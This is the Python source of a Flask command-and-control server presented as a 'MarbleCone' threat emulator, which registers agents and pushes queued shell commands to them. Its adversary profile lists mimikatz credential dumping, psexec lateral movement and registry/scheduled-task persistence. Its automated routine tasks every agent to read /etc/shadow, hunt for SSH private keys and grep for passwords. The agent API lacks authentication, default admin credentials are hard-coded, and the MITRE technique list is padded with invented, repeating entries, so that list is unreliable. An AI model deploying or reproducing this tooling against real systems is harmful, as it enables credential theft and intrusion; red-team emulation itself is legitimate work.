from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
import json
import datetime
import uuid
import threading
import time
import random
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your-secret-key-here')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///marblecone.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# Database Models
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(120), nullable=False)
    role = db.Column(db.String(20), default='operator')

class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(80), unique=True, nullable=False)
    paw = db.Column(db.String(80), unique=True, nullable=False)
    platform = db.Column(db.String(20), nullable=False)
    host = db.Column(db.String(80), nullable=False)
    status = db.Column(db.String(20), default='active')
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

class Operation(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(80), nullable=False)
    adversary_id = db.Column(db.String(80), nullable=False)
    status = db.Column(db.String(20), default='running')
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    completed_at = db.Column(db.DateTime)

class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    operation_id = db.Column(db.Integer, db.ForeignKey('operation.id'), nullable=False)
    agent_id = db.Column(db.Integer, db.ForeignKey('agent.id'), nullable=False)
    command = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(20), default='pending')
    result = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# MarbleCone Adversary Profile
MARBLECONE_PROFILE = {
    'id': 'marblecone',
    'name': 'MarbleCone',
    'description': 'Advanced persistent threat group targeting governments, financial institutions, and critical infrastructure',
    'tactics': [
        'Initial Access',
        'Execution',
        'Persistence',
        'Privilege Escalation',
        'Defense Evasion',
        'Credential Access',
        'Discovery',
        'Lateral Movement',
        'Collection',
        'Command and Control',
        'Exfiltration'
    ],
    'techniques': [
        'T1078.001 - Default Accounts',
        'T1078.002 - Domain Accounts',
        'T1078.003 - Local Accounts',
        'T1078.004 - Cloud Accounts',
        'T1059.001 - PowerShell',
        'T1059.003 - Windows Command Shell',
        'T1059.005 - Visual Basic',
        'T1059.007 - JavaScript',
        'T1053.005 - Scheduled Task/Job',
        'T1053.003 - Cron',
        'T1547.001 - Registry Run Keys',
        'T1547.015 - Login Items',
        'T1136.001 - Local Account',
        'T1136.002 - Domain Account',
        'T1136.003 - Cloud Account',
        'T1083 - File and Directory Discovery',
        'T1057 - Process Discovery',
        'T1012 - Query Registry',
        'T1018 - Remote System Discovery',
        'T1049 - System Network Connections Discovery',
        'T1033 - System Owner/User Discovery',
        'T1007 - System Service Discovery',
        'T1124 - System Time Discovery',
        'T1016 - System Network Configuration Discovery',
        'T1082 - System Information Discovery',
        'T1010 - Application Window Discovery',
        'T1056.001 - Keylogging',
        'T1056.002 - GUI Input Capture',
        'T1056.003 - Web Portal Capture',
        'T1056.004 - Credential API Hooking',
        'T1113 - Screen Capture',
        'T1123 - Audio Capture',
        'T1119 - Automated Collection',
        'T1005 - Data from Local System',
        'T1039 - Data from Network Shared Drive',
        'T1003.001 - LSASS Memory',
        'T1003.002 - Security Account Manager',
        'T1003.003 - NTDS',
        'T1003.004 - LSA Secrets',
        'T1003.005 - Cached Domain Credentials',
        'T1003.006 - DCSync',
        'T1003.007 - Proc Filesystem',
        'T1003.008 - /etc/passwd and /etc/shadow',
        'T1003.009 - 3rd-party Credential Manager',
        'T1003.010 - NTDS from NTDS.dit',
        'T1003.011 - Network Device Configuration Dump',
        'T1003.012 - SAM Database',
        'T1003.013 - Cloud Instance Metadata API',
        'T1003.014 - Private Keys',
        'T1003.015 - Two-Factor Authentication Interception',
        'T1003.016 - DCSync Alternative',
        'T1003.017 - OS Credential Dumping',
        'T1003.018 - Steal Web Session Cookie',
        'T1003.019 - Steal Application Access Token',
        'T1003.020 - Steal Authentication Certificate',
        'T1003.021 - Steal Device Registration Certificate',
        'T1003.022 - Steal Kerberos Tickets',
        'T1003.023 - Steal Application Access Token',
        'T1003.024 - Steal Authentication Certificate',
        'T1003.025 - Steal Device Registration Certificate',
        'T1003.026 - Steal Kerberos Tickets',
        'T1003.027 - Steal Application Access Token',
        'T1003.028 - Steal Authentication Certificate',
        'T1003.029 - Steal Device Registration Certificate',
        'T1003.030 - Steal Kerberos Tickets',
        'T1003.031 - Steal Application Access Token',
        'T1003.032 - Steal Authentication Certificate',
        'T1003.033 - Steal Device Registration Certificate',
        'T1003.034 - Steal Kerberos Tickets',
        'T1003.035 - Steal Application Access Token',
        'T1003.036 - Steal Authentication Certificate',
        'T1003.037 - Steal Device Registration Certificate',
        'T1003.038 - Steal Kerberos Tickets',
        'T1003.039 - Steal Application Access Token',
        'T1003.040 - Steal Authentication Certificate',
        'T1003.041 - Steal Device Registration Certificate',
        'T1003.042 - Steal Kerberos Tickets',
        'T1003.043 - Steal Application Access Token',
        'T1003.044 - Steal Authentication Certificate',
        'T1003.045 - Steal Device Registration Certificate',
        'T1003.046 - Steal Kerberos Tickets',
        'T1003.047 - Steal Application Access Token',
        'T1003.048 - Steal Authentication Certificate',
        'T1003.049 - Steal Device Registration Certificate',
        'T1003.050 - Steal Kerberos Tickets'
    ],
    'abilities': [
        {
            'id': 'marblecone-001',
            'name': 'Advanced Reconnaissance',
            'description': 'Sophisticated system information gathering and network topology mapping',
            'command': 'whoami && hostname && ipconfig /all && netstat -an',
            'tactic': 'Discovery'
        },
        {
            'id': 'marblecone-002',
            'name': 'Credential Harvesting',
            'description': 'Advanced credential extraction from memory, registry, and cloud services',
            'command': 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"',
            'tactic': 'Credential Access'
        },
        {
            'id': 'marblecone-003',
            'name': 'Stealth Lateral Movement',
            'description': 'Advanced lateral movement using stolen credentials and zero-day exploits',
            'command': 'psexec.exe \\\\target -u username -p password -d cmd.exe /c "powershell -enc [encoded_command]"',
            'tactic': 'Lateral Movement'
        },
        {
            'id': 'marblecone-004',
            'name': 'Data Exfiltration',
            'description': 'Sophisticated data exfiltration with encryption and compression',
            'command': 'powershell -c "Compress-Archive -Path C:\\sensitive\\* -DestinationPath C:\\temp\\data.zip; Add-Type -AssemblyName System.Security; $key = [System.Security.Cryptography.Aes]::Create(); $key.GenerateKey(); $key.GenerateIV();"',
            'tactic': 'Exfiltration'
        },
        {
            'id': 'marblecone-005',
            'name': 'Advanced Persistence',
            'description': 'Establish multiple persistence mechanisms for long-term access',
            'command': 'schtasks /create /tn "SystemUpdate" /tr "cmd.exe" /sc onstart /ru system /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemService" /t REG_SZ /d "cmd.exe" /f',
            'tactic': 'Persistence'
        }
    ]
}

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# Routes
@app.route('/')
@login_required
def dashboard():
    agents = Agent.query.all()
    operations = Operation.query.all()
    return render_template('dashboard.html', agents=agents, operations=operations, marblecone=MARBLECONE_PROFILE)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()
        
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password')
    
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/agents')
@login_required
def agents():
    agents = Agent.query.all()
    return render_template('agents.html', agents=agents)

@app.route('/operations')
@login_required
def operations():
    operations = Operation.query.order_by(Operation.created_at.desc()).all()
    return render_template('operations.html', operations=operations, marblecone=MARBLECONE_PROFILE)

@app.route('/create_operation', methods=['GET', 'POST'])
@login_required
def create_operation():
    if request.method == 'POST':
        name = request.form.get('name')
        adversary_id = request.form.get('adversary_id', 'marblecone')
        description = request.form.get('description', '')
        
        # Create the operation
        operation = Operation(
            name=name,
            adversary_id=adversary_id,
            status='running'
        )
        db.session.add(operation)
        db.session.commit()
        
        # Send real commands to connected agents instead of simulation
        threading.Thread(target=send_real_commands, args=(operation.id,), daemon=True).start()
        
        flash(f'Operation "{name}" started successfully!', 'success')
        return redirect(url_for('operations'))
    
    return render_template('create_operation.html', marblecone=MARBLECONE_PROFILE)

@app.route('/api/agents', methods=['GET', 'POST'])
def api_agents():
    if request.method == 'POST':
        # Agent registration
        data = request.get_json()
        agent = Agent(
            name=data['name'],
            paw=data['paw'],
            platform=data['platform'],
            host=data['host'],
            status=data.get('status', 'active')
        )
        db.session.add(agent)
        db.session.commit()
        return jsonify({'id': agent.id, 'status': 'registered'}), 200
    
    # GET request - return all agents
    agents = Agent.query.all()
    return jsonify([{
        'id': agent.id,
        'name': agent.name,
        'paw': agent.paw,
        'platform': agent.platform,
        'host': agent.host,
        'status': agent.status
    } for agent in agents])

@app.route('/api/agents/<paw>/tasks', methods=['GET'])
def api_agent_tasks(paw):
    """Get pending tasks for an agent"""
    agent = Agent.query.filter_by(paw=paw).first()
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    # Get pending tasks for this agent
    pending_tasks = Task.query.filter_by(agent_id=agent.id, status='pending').all()
    
    tasks = []
    for task in pending_tasks:
        tasks.append({
            'id': task.id,
            'command': task.command,
            'description': f'Task {task.id}'
        })
    
    return jsonify({'tasks': tasks})

@app.route('/api/tasks/<int:task_id>/result', methods=['POST'])
def api_task_result(task_id):
    """Submit task result"""
    task = Task.query.get(task_id)
    if not task:
        return jsonify({'error': 'Task not found'}), 404
    
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No JSON data provided'}), 400
    
    # Handle the agent's JSON format (result, exit_code, timestamp)
    result = data.get('result', '')
    exit_code = data.get('exit_code', 0)
    timestamp = data.get('timestamp', '')
    
    # Store the complete result data
    task.result = f"Exit Code: {exit_code}\nTimestamp: {timestamp}\n\nOutput:\n{result}"
    task.status = 'completed'
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/api/operations', methods=['GET'])
@login_required
def api_operations():
    operations = Operation.query.all()
    return jsonify([{
        'id': operation.id,
        'name': operation.name,
        'adversary_id': operation.adversary_id,
        'status': operation.status,
        'created_at': operation.created_at.isoformat()
    } for operation in operations])

@app.route('/agent/linux')
def download_linux_agent():
    """Download the Linux agent script"""
    return send_from_directory(directory='.', path='marblecone_agent.sh', as_attachment=True, download_name='marblecone_agent.sh')

@app.route('/api/tasks', methods=['POST'])
def api_create_task():
    """Create a new task for an agent"""
    data = request.get_json()
    
    # Find the agent by PAW
    agent = Agent.query.filter_by(paw=data['agent_paw']).first()
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    # Create the task
    task = Task(
        operation_id=data.get('operation_id', 1),
        agent_id=agent.id,
        command=data['command'],
        status='pending'
    )
    db.session.add(task)
    db.session.commit()
    
    return jsonify({
        'id': task.id,
        'status': 'created',
        'message': f'Task created for agent {agent.name}'
    }), 201

@app.route('/api/send_test_tasks', methods=['POST'])
def send_test_tasks():
    """Send test tasks to the connected Linux agent"""
    # Find the Linux agent
    agent = Agent.query.filter(Agent.name.like('linux-agent%')).first()
    if not agent:
        return jsonify({'error': 'No Linux agent found'}), 404
    
    # Test tasks for Linux
    test_tasks = [
        {
            'command': 'whoami && hostname && id',
            'description': 'User and system information'
        },
        {
            'command': 'ps aux | head -10',
            'description': 'Process listing'
        },
        {
            'command': 'netstat -tuln | head -10',
            'description': 'Network connections'
        },
        {
            'command': 'ls -la /tmp',
            'description': 'Temporary directory listing'
        },
        {
            'command': 'cat /etc/passwd | head -5',
            'description': 'User account information'
        }
    ]
    
    created_tasks = []
    for task_data in test_tasks:
        task = Task(
            operation_id=1,  # Default operation
            agent_id=agent.id,
            command=task_data['command'],
            status='pending'
        )
        db.session.add(task)
        created_tasks.append({
            'id': task.id,
            'command': task.command,
            'description': task_data['description']
        })
    
    db.session.commit()
    
    return jsonify({
        'message': f'Sent {len(created_tasks)} test tasks to agent {agent.name}',
        'tasks': created_tasks
    }), 201

def send_real_commands(operation_id):
    """Send real commands to agents systematically"""
    agents = Agent.query.filter_by(status='active').all()
    if not agents:
        print("No active agents found")
        return
    
    # Enhanced command set with credential harvesting and lateral movement
    real_commands = [
        # Basic Reconnaissance
        {
            'command': 'whoami && id && groups',
            'description': 'User identity and group information'
        },
        {
            'command': 'hostname && uname -a',
            'description': 'System information'
        },
        {
            'command': 'ps aux | head -10',
            'description': 'Process listing'
        },
        {
            'command': 'netstat -tuln | head -10',
            'description': 'Network connections'
        },
        {
            'command': 'ls -la /tmp',
            'description': 'Temporary directory listing'
        },
        {
            'command': 'df -h',
            'description': 'Disk usage information'
        },
        {
            'command': 'w',
            'description': 'Current users and system load'
        },
        {
            'command': 'last | head -5',
            'description': 'Recent login history'
        },
        
        # Credential Harvesting
        {
            'command': 'cat /etc/passwd | head -10',
            'description': 'User account enumeration'
        },
        {
            'command': 'cat /etc/shadow 2>/dev/null || echo "Shadow file not accessible"',
            'description': 'Password hash extraction attempt'
        },
        {
            'command': 'find /home -name "*.bash_history" -exec tail -5 {} \; 2>/dev/null || echo "No bash history found"',
            'description': 'Bash history search'
        },
        {
            'command': 'find /home -name ".ssh" -type d 2>/dev/null || echo "No SSH directories found"',
            'description': 'SSH key discovery'
        },
        {
            'command': 'find /home -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null || echo "No private keys found"',
            'description': 'Private key discovery'
        },
        {
            'command': 'grep -r "password\|passwd\|pwd" /home/*/.bashrc /home/*/.profile 2>/dev/null || echo "No password references found"',
            'description': 'Password reference search'
        },
        
        # Lateral Movement Preparation
        {
            'command': 'cat /etc/hosts',
            'description': 'Host file analysis'
        },
        {
            'command': 'arp -a',
            'description': 'ARP table analysis'
        },
        {
            'command': 'netstat -rn',
            'description': 'Routing table analysis'
        },
        {
            'command': 'ping -c 1 8.8.8.8 2>/dev/null || echo "No internet connectivity"',
            'description': 'Internet connectivity test'
        },
        {
            'command': 'which ssh 2>/dev/null || echo "SSH not found"',
            'description': 'SSH client availability'
        },
        {
            'command': 'which nc 2>/dev/null || echo "Netcat not found"',
            'description': 'Netcat availability'
        },
        {
            'command': 'which python3 2>/dev/null || echo "Python3 not found"',
            'description': 'Python3 availability'
        },
        
        # Persistence and Privilege Escalation
        {
            'command': 'crontab -l 2>/dev/null || echo "No crontab found"',
            'description': 'Scheduled tasks enumeration'
        },
        {
            'command': 'ls -la /etc/cron.* 2>/dev/null || echo "No cron directories found"',
            'description': 'System cron jobs'
        },
        {
            'command': 'find / -perm -4000 -type f 2>/dev/null | head -5 || echo "No SUID files found"',
            'description': 'SUID file discovery'
        },
        {
            'command': 'sudo -l 2>/dev/null || echo "No sudo access"',
            'description': 'Sudo privileges check'
        },
        {
            'command': 'groups',
            'description': 'Current user groups'
        }
    ]
    
    # Send commands to each agent systematically
    for agent in agents:
        print(f"Starting systematic command execution for agent {agent.name}")
        
        for i, cmd_data in enumerate(real_commands):
            # Create task
            task = Task(
                operation_id=operation_id,
                agent_id=agent.id,
                command=cmd_data['command'],
                status='pending'
            )
            db.session.add(task)
            db.session.commit()
            
            print(f"Created task {task.id}: {cmd_data['description']}")
            
            # Wait for task completion (poll every 3 seconds, max 120 seconds)
            max_wait = 120  # Increased from 60 to 120 seconds
            wait_time = 0
            while wait_time < max_wait:
                time.sleep(3)  # Increased from 2 to 3 seconds
                wait_time += 3
                
                # Check if task is completed
                task = Task.query.get(task.id)
                if task and task.status == 'completed':
                    print(f"Task {task.id} completed: {cmd_data['description']}")
                    break
                elif wait_time >= max_wait:
                    print(f"Task {task.id} timed out: {cmd_data['description']}")
                    task.status = 'timeout'
                    db.session.commit()
                    break
            
            # Small delay between commands
            time.sleep(2)  # Increased from 1 to 2 seconds
    
    # Mark operation as completed
    operation = Operation.query.get(operation_id)
    operation.status = 'completed'
    operation.completed_at = datetime.datetime.utcnow()
    db.session.commit()
    
    print(f"Operation {operation_id}: COMPLETED - All commands executed systematically")
    print(f"Download the report from the Operations page to see all results!")

def create_sample_data():
    """Create sample data for demonstration"""
    # Create admin user
    if not User.query.filter_by(username='admin').first():
        admin = User(
            username='admin',
            password_hash=generate_password_hash('admin123'),
            role='admin'
        )
        db.session.add(admin)
    
    # Create sample agent
    if not Agent.query.filter_by(name='WIN-ABC123').first():
        agent = Agent(
            name='WIN-ABC123',
            paw=str(uuid.uuid4()),
            platform='windows',
            host='192.168.1.100',
            status='active'
        )
        db.session.add(agent)
    
    db.session.commit()

@app.route('/api/agents/<int:agent_id>', methods=['DELETE'])
def delete_agent(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    db.session.delete(agent)
    db.session.commit()
    return jsonify({'status': 'deleted'})

@app.route('/api/operations/<int:operation_id>', methods=['DELETE'])
def delete_operation(operation_id):
    operation = Operation.query.get(operation_id)
    if not operation:
        return jsonify({'error': 'Operation not found'}), 404
    Task.query.filter_by(operation_id=operation_id).delete()
    db.session.delete(operation)
    db.session.commit()
    return jsonify({'status': 'deleted'})

@app.route('/api/operations/<int:operation_id>/report', methods=['GET'])
def operation_report(operation_id):
    operation = Operation.query.get(operation_id)
    if not operation:
        return "Operation not found", 404
    
    tasks = Task.query.filter_by(operation_id=operation_id).order_by(Task.id).all()
    
    report_lines = [
        "=" * 80,
        f"MARBLECONE THREAT EMULATION OPERATION REPORT",
        "=" * 80,
        f"Operation Name: {operation.name}",
        f"Operation ID: {operation.id}",
        f"Status: {operation.status.upper()}",
        f"Created: {operation.created_at.strftime('%Y-%m-%d %H:%M:%S')}",
        f"Completed: {operation.completed_at.strftime('%Y-%m-%d %H:%M:%S') if operation.completed_at else 'N/A'}",
        f"Total Tasks: {len(tasks)}",
        f"Completed Tasks: {len([t for t in tasks if t.status == 'completed'])}",
        f"Failed Tasks: {len([t for t in tasks if t.status == 'timeout'])}",
        "",
        "EXECUTION SUMMARY:",
        "-" * 40,
    ]
    
    # Group tasks by agent
    agents = {}
    for task in tasks:
        agent = Agent.query.get(task.agent_id)
        if agent:
            if agent.name not in agents:
                agents[agent.name] = []
            agents[agent.name].append(task)
    
    for agent_name, agent_tasks in agents.items():
        report_lines.extend([
            f"",
            f"AGENT: {agent_name}",
            f"Platform: {Agent.query.filter_by(name=agent_name).first().platform}",
            f"Host: {Agent.query.filter_by(name=agent_name).first().host}",
            f"Tasks Executed: {len(agent_tasks)}",
            f"",
        ])
        
        for i, task in enumerate(agent_tasks, 1):
            report_lines.extend([
                f"Task {i}: {task.command}",
                f"Status: {task.status.upper()}",
                f"Result:",
                f"{task.result or 'No result available'}",
                f"",
                "-" * 60,
                f"",
            ])
    
    report_lines.extend([
        "",
        "=" * 80,
        "REPORT GENERATED: " + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "MarbleCone Threat Emulator - Real Command Execution Results",
        "=" * 80,
    ])
    
    report = "\n".join(report_lines)
    return report, 200, {
        'Content-Type': 'text/plain; charset=utf-8', 
        'Content-Disposition': f'attachment; filename=marblecone_operation_{operation_id}_report.txt'
    }

@app.route('/api/operations/<int:operation_id>/status', methods=['GET'])
def api_operation_status(operation_id):
    """Get operation status"""
    operation = Operation.query.get(operation_id)
    if not operation:
        return jsonify({'error': 'Operation not found'}), 404
    
    tasks = Task.query.filter_by(operation_id=operation_id).all()
    completed_tasks = len([t for t in tasks if t.status == 'completed'])
    failed_tasks = len([t for t in tasks if t.status == 'timeout'])
    
    return jsonify({
        'id': operation.id,
        'name': operation.name,
        'status': operation.status,
        'total_tasks': len(tasks),
        'completed_tasks': completed_tasks,
        'failed_tasks': failed_tasks,
        'created_at': operation.created_at.isoformat() if operation.created_at else None,
        'completed_at': operation.completed_at.isoformat() if operation.completed_at else None
    })

@app.route('/api/operations/<int:operation_id>/start', methods=['POST'])
def api_start_operation(operation_id):
    """Start systematic command execution for an operation"""
    operation = Operation.query.get(operation_id)
    if not operation:
        return jsonify({'error': 'Operation not found'}), 404
    
    # Start the systematic command execution in a background thread
    import threading
    thread = threading.Thread(target=send_real_commands, args=(operation_id,))
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'message': 'Command execution started'})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        create_sample_data()
    
    print("MarbleCone Threat Emulator - MarbleCone Replica")
    print("Access the application at: http://localhost:5000")
    print("Login credentials: admin / admin123")
    
    app.run(debug=True, host='0.0.0.0', port=5000) 